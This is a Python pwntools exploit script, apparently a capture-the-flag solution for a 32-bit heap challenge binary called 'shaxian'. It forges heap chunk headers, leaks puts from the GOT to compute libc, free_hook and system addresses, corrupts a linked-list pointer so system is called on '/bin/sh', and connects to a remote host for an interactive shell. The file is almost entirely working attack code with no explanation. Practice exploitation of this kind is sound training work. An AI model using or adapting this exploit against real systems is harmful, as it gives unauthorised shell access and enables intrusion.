from pwn import *
#from LibcSearch import *
context.binary = ELF("./shaxian")
context.log_level = 'debug'

elf = context.binary
libc = elf.libc

def dbg():
	gdb.attach(p, 'b* 0x08048965 ')
	raw_input()

def pre(addr, phone):
	p.sendlineafter('Address', addr)
	p.sendlineafter('number', phone)
def menu(ch):
	p.sendlineafter('choose', str(ch))

def add(content, cnt):
	menu(1)
	p.sendlineafter('5.Jianjiao', content)
	p.recvuntil('many?')
	raw_input()
	p.sendline(str(cnt))

def free():
	menu(2)

def recpt(title):
	menu(3)
	p.sendlineafter('Taitou:', title)

def view():
	menu(4)

def exploit():
	address = p32(0x30) + p32(0x31)
	phone = 'a'*0xf0 + p32(0) + p32(0x31)						#
	pre(address, phone)
	#dbg()
	#heap from low to high
	#write from high to low
	#add 0x20  + next  + pre_size  +  size
	add('a'*0x20 + p32(0x0804B028), '1')
	view()
	puts_addr = u32(p.recvuntil('\xf7')[-4:])
	libc_base = puts_addr - 0x5f140
	print "puts ==> ", hex(puts_addr)
	print "libc_base ==> ", hex(libc_base)
	__free_hook = libc_base + 0x1b18b0
	system = libc_base + 0x3a940

	add('a'*0x20 + p32(0x0804B1b8), '2')						#
	free()
	#get list_head
	add('a'*4 + p32(0x0804B038), str(-(0x100000000 - system)))
	menu('/bin/sh\x00')


	p.interactive()
	p.close()


if __name__ == '__main__':
	#p = process("./shaxian")
	p = remote('111.198.29.45', 55957)
	exploit()